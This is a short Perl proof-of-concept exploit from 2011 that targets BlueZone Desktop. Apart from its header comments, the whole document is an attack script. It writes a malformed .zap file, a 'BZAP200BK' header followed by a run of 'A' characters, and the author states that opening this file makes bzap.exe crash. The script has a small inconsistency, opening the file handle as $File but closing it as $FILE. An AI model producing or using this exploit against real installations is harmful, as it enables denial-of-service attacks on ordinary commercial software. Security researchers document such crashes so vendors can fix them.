# Exploit Title: BlueZone Desktop Malformed .zap file Local Denial of Service
# Date: 10-15-11
# Author: Silent Dream
# Software Link: http://www.rocketsoftware.com/bluezone/downloads/desktop-free-trial
# Version: Latest
# Tested on: Windows XP SP3

#To trigger: Run this script, double click file to open with bzap.exe, program dies.

my $file = "bluepwn.zap";
my $head = "BZAP200BK";
my $junk = "A" x 20;

open($File, ">$file");
print $File $head.$junk;
close($FILE);
